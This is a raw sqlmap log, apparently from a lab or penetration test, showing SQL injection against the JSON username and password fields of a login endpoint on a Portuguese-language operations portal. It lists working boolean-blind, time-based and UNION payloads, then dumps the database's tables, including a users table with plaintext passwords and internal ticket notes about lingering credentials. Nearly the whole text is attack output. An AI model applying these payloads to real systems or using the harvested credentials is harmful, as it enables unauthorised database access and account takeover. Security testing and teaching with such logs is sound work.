@@ -1,0 +1,158 @@
+        ___
+       __H__
+ ___ ___["]_____ ___ ___  {1.9.11#stable}
+|_ -| . [,]     | .'| . |
+|___|_  [']_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 17:01:51 /2026-06-04/
+
+[17:01:51] [INFO] parsing HTTP request from 'request.txt'
+JSON data found in POST body. Do you want to process it? [Y/n/q] [17:01:53] [INFO] resuming back-end DBMS 'mysql' 
+[17:01:53] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: JSON password ((custom) POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: {"username":"suporte.n1","password":"SimoC@2023' AND 3945=3945 AND 'sdcZ'='sdcZ"}
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: {"username":"suporte.n1","password":"SimoC@2023' AND (SELECT 1110 FROM (SELECT(SLEEP(5)))TAxX) AND 'clRN'='clRN"}
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 7 columns
+    Payload: {"username":"suporte.n1","password":"-2063' UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x7178786a71,0x626f4341737955596d535379614b72777965594b486f4753704353617a74444f7278445372694852,0x717a787071),NULL-- -"}
+
+Parameter: JSON username ((custom) POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: {"username":"suporte.n1' AND 1908=1908 AND 'WRkd'='WRkd","password":"SimoC@2023"}
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: {"username":"suporte.n1' AND (SELECT 6002 FROM (SELECT(SLEEP(5)))XoVL) AND 'mMeg'='mMeg","password":"SimoC@2023"}
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 7 columns
+    Payload: {"username":"-4230' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7178786a71,0x41566e77457473767865484157714476595770446851696a496678555554677a687a565469486a42,0x717a787071),NULL,NULL-- -","password":"SimoC@2023"}
+---
+there were multiple injection points, please select the one to use for following injections:
+[0] place: (custom) POST, parameter: JSON username, type: Single quoted string (default)
+[1] place: (custom) POST, parameter: JSON password, type: Single quoted string
+[q] Quit
+> [17:01:56] [INFO] the back-end DBMS is MySQL
+web application technology: Express, Nginx 1.24.0
+back-end DBMS: MySQL >= 5.0.12
+[17:01:56] [INFO] fetching tables for database: 'portal_operacoes'
+[17:01:56] [INFO] resumed: 'app_settings'
+[17:01:56] [INFO] resumed: 'products'
+[17:01:56] [INFO] resumed: 'tickets'
+[17:01:56] [INFO] resumed: 'users'
+[17:01:56] [INFO] fetching columns for table 'products' in database 'portal_operacoes'
+[17:01:57] [INFO] resumed: 'id','int(11)'
+[17:01:57] [INFO] resumed: 'name','varchar(255)'
+[17:01:57] [INFO] resumed: 'sku','varchar(60)'
+[17:01:57] [INFO] resumed: 'description','text'
+[17:01:57] [INFO] resumed: 'active','tinyint(4)'
+[17:01:57] [INFO] fetching entries for table 'products' in database 'portal_operacoes'
+[17:01:57] [INFO] resumed: '1','Pacote de abertura e validacao cadastral','Kit Cadastro PJ','1','CAD-PJ-001'
+[17:01:57] [INFO] resumed: '1','Integracao legada com conciliacao noturna','Modulo Pagamentos','2','PAY-LEG-020'
+[17:01:57] [INFO] resumed: '1','Consulta interna de convenios ativos','Consulta Convenios','3','CNV-INT-014'
+[17:01:57] [INFO] resumed: '0','Rotina mantida para compatibilidade','Relatorio Arquivo Morto','4','RPT-OLD-005'
+Database: portal_operacoes
+Table: products
+[4 entries]
++----+-------------+-------------------------+----------+-------------------------------------------+
+| id | sku         | name                    | active   | description                               |
++----+-------------+-------------------------+----------+-------------------------------------------+
+| 1  | CAD-PJ-001  | Kit Cadastro PJ         | 1        | Pacote de abertura e validacao cadastral  |
+| 2  | PAY-LEG-020 | Modulo Pagamentos       | 1        | Integracao legada com conciliacao noturna |
+| 3  | CNV-INT-014 | Consulta Convenios      | 1        | Consulta interna de convenios ativos      |
+| 4  | RPT-OLD-005 | Relatorio Arquivo Morto | 0        | Rotina mantida para compatibilidade       |
++----+-------------+-------------------------+----------+-------------------------------------------+
+
+[17:01:57] [INFO] table 'portal_operacoes.products' dumped to CSV file '/root/.local/share/sqlmap/output/10.10.100.100/dump/portal_operacoes/products.csv'
+[17:01:57] [INFO] fetching columns for table 'users' in database 'portal_operacoes'
+[17:01:57] [INFO] resumed: 'id','int(11)'
+[17:01:57] [INFO] resumed: 'username','varchar(100)'
+[17:01:57] [INFO] resumed: 'password','varchar(100)'
+[17:01:57] [INFO] resumed: 'role','varchar(50)'
+[17:01:57] [INFO] resumed: 'department','varchar(100)'
+[17:01:57] [INFO] resumed: 'status','varchar(30)'
+[17:01:57] [INFO] fetching entries for table 'users' in database 'portal_operacoes'
+[17:01:57] [INFO] resumed: 'admin','active','Tecnologia','1','admin','admin'
+[17:01:57] [INFO] resumed: 'publisher','active','Canais Digitais','2','Portal#2023','publicador.web'
+[17:01:57] [INFO] resumed: 'support','active','Service Desk','3','SimoC@2023','suporte.n1'
+[17:01:57] [INFO] resumed: 'analyst','active','Operacoes','4','scmtk4','analista.campo'
+[17:01:57] [INFO] resumed: 'operator','active','Operacoes','5','Marina@2023','marina.ops'
+[17:01:57] [INFO] resumed: 'readonly','active','Fornecedores','6','consulta123','consulta.ext'
+Database: portal_operacoes
+Table: users
+[6 entries]
++----+-----------+----------+-------------+----------------+-----------------+
+| id | role      | status   | password    | username       | department      |
++----+-----------+----------+-------------+----------------+-----------------+
+| 1  | admin     | active   | admin       | admin          | Tecnologia      |
+| 2  | publisher | active   | Portal#2023 | publicador.web | Canais Digitais |
+| 3  | support   | active   | SimoC@2023  | suporte.n1     | Service Desk    |
+| 4  | analyst   | active   | scmtk4      | analista.campo | Operacoes       |
+| 5  | operator  | active   | Marina@2023 | marina.ops     | Operacoes       |
+| 6  | readonly  | active   | consulta123 | consulta.ext   | Fornecedores    |
++----+-----------+----------+-------------+----------------+-----------------+
+
+[17:01:57] [INFO] table 'portal_operacoes.users' dumped to CSV file '/root/.local/share/sqlmap/output/10.10.100.100/dump/portal_operacoes/users.csv'
+[17:01:57] [INFO] fetching columns for table 'app_settings' in database 'portal_operacoes'
+[17:01:57] [INFO] resumed: 'setting_key','varchar(100)'
+[17:01:57] [INFO] resumed: 'setting_value','varchar(255)'
+[17:01:57] [INFO] resumed: 'updated_by','varchar(100)'
+[17:01:57] [INFO] fetching entries for table 'app_settings' in database 'portal_operacoes'
+[17:01:57] [INFO] resumed: 'auth.mode','legacy-token','admin'
+[17:01:57] [INFO] resumed: 'database.engine','mysql-5.5.62','admin'
+[17:01:57] [INFO] resumed: 'portal.release','1.7.3-hml','publicador.web'
+Database: portal_operacoes
+Table: app_settings
+[3 entries]
++----------------+-----------------+---------------+
+| updated_by     | setting_key     | setting_value |
++----------------+-----------------+---------------+
+| admin          | auth.mode       | legacy-token  |
+| admin          | database.engine | mysql-5.5.62  |
+| publicador.web | portal.release  | 1.7.3-hml     |
++----------------+-----------------+---------------+
+
+[17:01:57] [INFO] table 'portal_operacoes.app_settings' dumped to CSV file '/root/.local/share/sqlmap/output/10.10.100.100/dump/portal_operacoes/app_settings.csv'
+[17:01:57] [INFO] fetching columns for table 'tickets' in database 'portal_operacoes'
+[17:01:57] [INFO] resumed: 'id','int(11)'
+[17:01:57] [INFO] resumed: 'protocol','varchar(30)'
+[17:01:57] [INFO] resumed: 'requester','varchar(100)'
+[17:01:57] [INFO] resumed: 'subject','varchar(255)'
+[17:01:57] [INFO] resumed: 'notes','text'
+[17:01:57] [INFO] resumed: 'priority','varchar(20)'
+[17:01:57] [INFO] resumed: 'created_at','datetime'
+[17:01:57] [INFO] fetching entries for table 'tickets' in database 'portal_operacoes'
+[17:01:57] [INFO] resumed: 'Falha intermitente no catalogo','2023-08-14 09:35:00','1','Servico legado usa usuario app_service. Validar migracao antes de...
+[17:01:57] [INFO] resumed: 'Publicacao de conteudo','2023-08-18 16:20:00','2','Credencial temporaria mantida ate finalizar janela de homologacao.','baix...
+[17:01:57] [INFO] resumed: 'Ajuste de relatorio','2023-08-21 11:05:00','3','Rotina antiga consulta usuarios diretamente por nome.','alta','2023-1302','m...
+Database: portal_operacoes
+Table: tickets
+[3 entries]
++----+----------------------------------------------------------------------------------+----------+-----------+--------------------------------+----------------+---------------------+
+| id | notes                                                                            | priority | protocol  | subject                        | requester      | created_at          |
++----+----------------------------------------------------------------------------------+----------+-----------+--------------------------------+----------------+---------------------+
+| 1  | Servico legado usa usuario app_service. Validar migracao antes de alterar senha. | media    | 2023-1187 | Falha intermitente no catalogo | suporte.n1     | 2023-08-14 09:35:00 |
+| 2  | Credencial temporaria mantida ate finalizar janela de homologacao.               | baixa    | 2023-1244 | Publicacao de conteudo         | publicador.web | 2023-08-18 16:20:00 |
+| 3  | Rotina antiga consulta usuarios diretamente por nome.                            | alta     | 2023-1302 | Ajuste de relatorio            | marina.ops     | 2023-08-21 11:05:00 |
++----+----------------------------------------------------------------------------------+----------+-----------+--------------------------------+----------------+---------------------+
+
+[17:01:57] [INFO] table 'portal_operacoes.tickets' dumped to CSV file '/root/.local/share/sqlmap/output/10.10.100.100/dump/portal_operacoes/tickets.csv'
+[17:01:57] [WARNING] HTTP error codes detected during run:
+500 (Internal Server Error) - 9 times
+[17:01:57] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/10.10.100.100'
+[17:01:57] [WARNING] your sqlmap version is outdated
+
+[*] ending @ 17:01:57 /2026-06-04/
+
